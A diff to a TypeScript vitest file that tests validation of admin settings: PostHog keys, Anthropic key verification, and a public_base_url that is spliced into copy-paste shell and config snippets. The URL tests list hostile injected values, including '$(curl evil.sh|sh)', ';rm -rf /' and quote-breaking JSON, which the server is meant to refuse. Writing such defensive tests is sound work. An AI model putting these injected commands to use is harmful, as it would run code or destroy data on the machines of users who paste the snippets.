@@ -7,7 +7,7 @@
  * values, and a partially-invalid PATCH must apply nothing (the response code
  * and server state must agree).
  */
-import { describe, it, expect, beforeEach, afterEach } from "vitest";
+import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
 import {
   setupTestEnv,
   createTestApp,
@@ -39,6 +39,9 @@ const SETTING_ENV = [
   "MAX_BODY_BYTES",
   "FEATURE_WORKFLOW_PLANE",
   "FEATURE_SUBAGENT_RUNS",
+  "POSTHOG_KEY",
+  "POSTHOG_HOST",
+  "TELEMETRY_ENABLED",
 ];
 
 beforeEach(() => {
@@ -137,6 +140,61 @@ describe("/admin/settings — validation", () => {
     expect(res.status).toBe(400);
     expect(res.data.error).toMatch(/PromptOwl sign-in/i);
     expect(res.data.fieldErrors).toHaveProperty("promptowl_sign_in_gate");
+  });
+
+  it("saves a PostHog key, rejects a junk key and a non-URL host", async () => {
+    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
+    const admin = await registerUser(app, OWNER_EMAIL);
+
+    const ok = await jsonRequest(
+      app,
+      "PATCH",
+      "/admin/settings",
+      { posthog_key: "phc_TestProjectKey0123456789abcdefXYZ", posthog_host: "https://eu.i.posthog.com/" },
+      admin.apiKey,
+    );
+    expect(ok.status).toBe(200);
+    // Trailing slash stripped, same as public_base_url.
+    expect(ok.data.settings.posthog_host).toBe("https://eu.i.posthog.com");
+    expect(await persistedSetting("POSTHOG_KEY")).toBe("phc_TestProjectKey0123456789abcdefXYZ");
+
+    // The browser gets the key from /health — but only while telemetry is on.
+    const health = await jsonRequest(app, "GET", "/health");
+    expect(health.data.posthog_key).toBe("phc_TestProjectKey0123456789abcdefXYZ");
+    await jsonRequest(app, "PATCH", "/admin/settings", { telemetry_enabled: false }, admin.apiKey);
+    const healthOff = await jsonRequest(app, "GET", "/health");
+    expect(healthOff.data.posthog_key).toBeNull();
+
+    const bad = await jsonRequest(
+      app, "PATCH", "/admin/settings", { posthog_host: "not-a-url" }, admin.apiKey,
+    );
+    expect(bad.status).toBe(400);
+    expect(bad.data.fieldErrors).toHaveProperty("posthog_host");
+
+    // A junk key was accepted and saved as-is (CU-wdqcq027fr); it must be
+    // rejected before anything is written, keyed to the field for the UI —
+    // and the message must name the rule that failed, so a key with the
+    // right prefix but half its length is not a mystery.
+    const junk: Array<[string, RegExp]> = [
+      ["abc123", /must start with phc_/],
+      ["phx_TestProjectKey0123456789abcdefXYZ", /must start with phc_/],
+      ["phc_ewrer", /too short/],
+      ["phc_Test Project Key 0123456789abcdef", /letters and digits/],
+    ];
+    for (const [key, reason] of junk) {
+      const badKey = await jsonRequest(
+        app, "PATCH", "/admin/settings", { posthog_key: key }, admin.apiKey,
+      );
+      expect(badKey.status).toBe(400);
+      expect(badKey.data.fieldErrors.posthog_key).toMatch(reason);
+    }
+    expect(await persistedSetting("POSTHOG_KEY")).toBe("phc_TestProjectKey0123456789abcdefXYZ");
+
+    // Clearing the key is still allowed — that is how analytics turns off.
+    const cleared = await jsonRequest(
+      app, "PATCH", "/admin/settings", { posthog_key: "" }, admin.apiKey,
+    );
+    expect(cleared.status).toBe(200);
   });
 
   it("rejects an out-of-range max_body_bytes", async () => {
@@ -406,5 +464,144 @@ describe("/admin/settings — agent SSO (token exchange) guard", () => {
       admin.apiKey,
     );
     expect(viaAutoProvisionOff.status).toBe(200);
+  });
+});
+
+/**
+ * public_base_url is spliced into the copy-paste snippets the Connecting-agents
+ * panel renders — a `bash` block for Claude Code and Codex, and quoted strings
+ * in config.toml / config.yaml / mcp.json for Codex, Hermes, Gemini CLI and
+ * Cursor. Those are pasted verbatim into a teammate's terminal and config
+ * files, so a value carrying shell metacharacters or a quote turns "can edit
+ * server settings" into code execution on everyone else's machine. It was
+ * stored with only a trim and a trailing-slash strip.
+ */
+describe("/admin/settings — public_base_url", () => {
+  it("accepts a well-formed http(s) URL and strips the trailing slash", async () => {
+    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
+    const admin = await registerUser(app, OWNER_EMAIL);
+    const ok = await jsonRequest(
+      app, "PATCH", "/admin/settings", { public_base_url: "https://nest.example.com/" }, admin.apiKey,
+    );
+    expect(ok.status).toBe(200);
+    const after = await jsonRequest(app, "GET", "/admin/settings", undefined, admin.apiKey);
+    expect(after.data.public_base_url).toBe("https://nest.example.com");
+  });
+
+  it("refuses a value that is not a http(s) URL", async () => {
+    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
+    const admin = await registerUser(app, OWNER_EMAIL);
+    for (const v of ["not-a-url", "ftp://nest.example.com", "javascript:alert(1)"]) {
+      const bad = await jsonRequest(
+        app, "PATCH", "/admin/settings", { public_base_url: v }, admin.apiKey,
+      );
+      expect(bad.status, `expected ${v} to be refused`).toBe(400);
+      expect(bad.data.fieldErrors).toHaveProperty("public_base_url");
+    }
+  });
+
+  it("refuses shell metacharacters and quotes, and writes nothing", async () => {
+    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
+    const admin = await registerUser(app, OWNER_EMAIL);
+    await jsonRequest(
+      app, "PATCH", "/admin/settings", { public_base_url: "https://good.example.com" }, admin.apiKey,
+    );
+    const hostile = [
+      "https://x.example/a$(curl evil.sh|sh)",
+      "https://x.example/a;rm -rf /",
+      'https://x.example/a","evil":"1',
+      "https://x.example/a&&whoami",
+    ];
+    for (const v of hostile) {
+      const bad = await jsonRequest(
+        app, "PATCH", "/admin/settings", { public_base_url: v }, admin.apiKey,
+      );
+      expect(bad.status, `expected ${v} to be refused`).toBe(400);
+      expect(bad.data.fieldErrors).toHaveProperty("public_base_url");
+    }
+    // Refused before anything is written — the earlier good value survives.
+    const after = await jsonRequest(app, "GET", "/admin/settings", undefined, admin.apiKey);
+    expect(after.data.public_base_url).toBe("https://good.example.com");
+  });
+});
+
+/**
+ * Saving an Anthropic key checks it. A key with the right shape but no
+ * standing behind it used to save cleanly and then surface as "Hootie
+ * couldn't reach the model" on the first question — the admin had no way to
+ * tell a bad key from a bad day.
+ */
+describe("/admin/settings — Anthropic key verification", () => {
+  /** Build an app whose key check answers however the test wants. */
+  async function appWithKeyCheck(rejectWith: string | null) {
+    vi.doMock("../src/hootie/model.js", () => ({
+      verifyModelKey: async () => rejectWith,
+      streamAnswer: async function* () {},
+      ModelRefusedError: class extends Error {},
+    }));
+    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
+    const admin = await registerUser(app, OWNER_EMAIL);
+    return { app, admin };
+  }
+
+  afterEach(() => {
+    vi.doUnmock("../src/hootie/model.js");
+    delete process.env.ANTHROPIC_API_KEY;
+  });
+
+  it("400s a key the provider rejects, and saves nothing", async () => {
+    const { app, admin } = await appWithKeyCheck("Anthropic rejected that key.");
+    const res = await jsonRequest(
+      app,
+      "PATCH",
+      "/admin/settings",
+      { anthropic_api_key: "sk-ant-not-a-real-key" },
+      admin.apiKey,
+    );
+    expect(res.status).toBe(400);
+    expect(res.data.fieldErrors).toHaveProperty("anthropic_api_key");
+    expect(process.env.ANTHROPIC_API_KEY).toBeUndefined();
+    expect(await persistedSetting("ANTHROPIC_API_KEY")).toBeUndefined();
+    const after = await jsonRequest(app, "GET", "/admin/settings", undefined, admin.apiKey);
+    expect(after.data.anthropic_api_key_masked).toBeNull();
+  });
+
+  it("saves a key the provider accepts", async () => {
+    const { app, admin } = await appWithKeyCheck(null);
+    const res = await jsonRequest(
+      app,
+      "PATCH",
+      "/admin/settings",
+      { anthropic_api_key: "sk-ant-good-key-1234" },
+      admin.apiKey,
+    );
+    expect(res.status).toBe(200);
+    expect(res.data.settings.anthropic_api_key_masked).toBe("••••1234");
+    expect(process.env.ANTHROPIC_API_KEY).toBe("sk-ant-good-key-1234");
+  });
+
+  it("clearing the key never calls the provider", async () => {
+    let called = false;
+    vi.doMock("../src/hootie/model.js", () => ({
+      verifyModelKey: async () => {
+        called = true;
+        return "should not be asked";
+      },
+      streamAnswer: async function* () {},
+      ModelRefusedError: class extends Error {},
+    }));
+    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
+    const admin = await registerUser(app, OWNER_EMAIL);
+    process.env.ANTHROPIC_API_KEY = "sk-ant-old";
+    const res = await jsonRequest(
+      app,
+      "PATCH",
+      "/admin/settings",
+      { anthropic_api_key: "" },
+      admin.apiKey,
+    );
+    expect(res.status).toBe(200);
+    expect(called).toBe(false);
+    expect(process.env.ANTHROPIC_API_KEY).toBeUndefined();
   });
 });
